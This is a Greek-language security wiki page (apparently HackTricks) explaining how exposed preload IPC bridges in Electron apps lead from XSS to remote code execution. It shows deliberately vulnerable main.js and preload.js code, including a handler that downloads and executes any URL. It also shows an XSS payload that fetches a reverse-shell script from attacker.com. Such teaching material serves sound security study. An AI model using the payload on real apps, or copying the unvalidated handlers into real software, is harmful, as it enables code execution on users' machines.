@@ -1,0 +1,114 @@
+# Electron contextIsolation RCE via IPC
+
+{{#include ../../banners/hacktricks-training.md}}
+
+Το context isolation δεν καθιστά ασφαλές ένα μη ασφαλές preload bridge. Αν ένα preload εκθέτει privileged IPC στο περιεχόμενο του renderer, ένα XSS ή ένας παραβιασμένος renderer μπορεί να καλέσει αυτό το bridge· το RCE εξαρτάται τότε από την επικύρωση και τις δυνατότητες του αντίστοιχου handler στη main process. Η Electron συνιστά να εκθέτετε μία στενά ορισμένη μέθοδο ανά λειτουργία, να επικυρώνετε τους αποστολείς IPC και να μην εκθέτετε ποτέ ακατέργαστα primitives IPC.<sup>[[3]](#references)[[4]](#references)</sup>
+
+**Τα περισσότερα από αυτά τα παραδείγματα προέρχονται από εδώ** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). Δείτε το βίντεο για περισσότερες πληροφορίες.<sup>[[1]](#references)</sup>
+
+## Παράδειγμα 0
+
+Παράδειγμα από [https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21) (στις διαφάνειες θα βρείτε ολόκληρο το παράδειγμα για το πώς έγινε κατάχρηση του MS Teams, από XSS έως RCE· αυτό είναι απλώς ένα πολύ βασικό παράδειγμα):<sup>[[2]](#references)</sup>
+
+<figure><img src="../../images/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+## Παράδειγμα 1
+
+Δείτε πώς το `main.js` ακούει στο `getUpdate` και θα **κατεβάσει και θα εκτελέσει οποιοδήποτε URL** δοθεί.\
+Δείτε επίσης πώς το `preload.js` **εκθέτει οποιοδήποτε συμβάν IPC** από τη main.
+
+```javascript
+// Part of code of main.js
+ipcMain.on("getUpdate", (event, url) => {
+  console.log("getUpdate: " + url)
+  mainWindow.webContents.downloadURL(url)
+  mainWindow.download_url = url
+})
+
+mainWindow.webContents.session.on(
+  "will-download",
+  (event, item, webContents) => {
+    console.log("downloads path=" + app.getPath("downloads"))
+    console.log("mainWindow.download_url=" + mainWindow.download_url)
+    url_parts = mainWindow.download_url.split("/")
+    filename = url_parts[url_parts.length - 1]
+    mainWindow.downloadPath = app.getPath("downloads") + "/" + filename
+    console.log("downloadPath=" + mainWindow.downloadPath)
+    // Set the save path, making Electron not to prompt a save dialog.
+    item.setSavePath(mainWindow.downloadPath)
+
+    item.on("updated", (event, state) => {
+      if (state === "interrupted") {
+        console.log("Download is interrupted but can be resumed")
+      } else if (state === "progressing") {
+        if (item.isPaused()) console.log("Download is paused")
+        else console.log(`Received bytes: ${item.getReceivedBytes()}`)
+      }
+    })
+
+    item.once("done", (event, state) => {
+      if (state === "completed") {
+        console.log("Download successful, running update")
+        fs.chmodSync(mainWindow.downloadPath, 0755)
+        var child = require("child_process").execFile
+        child(mainWindow.downloadPath, function (err, data) {
+          if (err) {
+            console.error(err)
+            return
+          }
+          console.log(data.toString())
+        })
+      } else console.log(`Download failed: ${state}`)
+    })
+  }
+)
+```
+
+```javascript
+// Part of code of preload.js
+window.electronSend = (event, data) => {
+  ipcRenderer.send(event, data)
+}
+```
+
+Exploit:
+
+```html
+<script>
+  electronSend("getUpdate", "https://attacker.com/path/to/revshell.sh")
+</script>
+```
+
+## Παράδειγμα 2
+
+Αν το preload εκθέτει το `shell.openExternal` χωρίς επικύρωση του scheme και του προορισμού, είσοδος που ελέγχεται από τον renderer μπορεί να εκκινήσει καταχωρισμένους εξωτερικούς handlers. Το αν αυτό οδηγεί σε εκτέλεση κώδικα εξαρτάται από την πλατφόρμα, τους εγκατεστημένους handlers, το scheme και την έκδοση του Electron· περιορίστε το σε μια ρητή allowlist αναμενόμενων προορισμών `https:`.<sup>[[3]](#references)</sup>
+
+```javascript
+// Part of preload.js code
+window.electronOpenInBrowser = (url) => {
+  shell.openExternal(url)
+}
+```
+
+## Παράδειγμα 3
+
+Αν το preload εκθέτει απεριόριστη επικοινωνία με την κύρια διεργασία, ένα XSS μπορεί να στείλει αυθαίρετα ονόματα καναλιών και δεδομένα. Ο αντίκτυπος εξαρτάται από τους καταχωρισμένους handlers IPC και τους ελέγχους εξουσιοδότησής τους.
+
+```javascript
+window.electronListen = (event, cb) => {
+  ipcRenderer.on(event, cb)
+}
+
+window.electronSend = (event, data) => {
+  ipcRenderer.send(event, data)
+}
+```
+
+
+## References
+
+- [1] [Παραβίαση σύγχρονων desktop εφαρμογών με XSS και RCE: Workshop](https://www.youtube.com/watch?v=xILfQGkLXQo)
+- [2] [Πώς παραβίασα το Microsoft Teams και κέρδισα $150.000 στο Pwn2Own](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)
+- [3] [Electron — Λίστα ελέγχου ασφάλειας](https://www.electronjs.org/docs/latest/tutorial/security)
+- [4] [Electron — Απομόνωση context και ασφαλής έκθεση API](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
+{{#include ../../banners/hacktricks-training.md}}
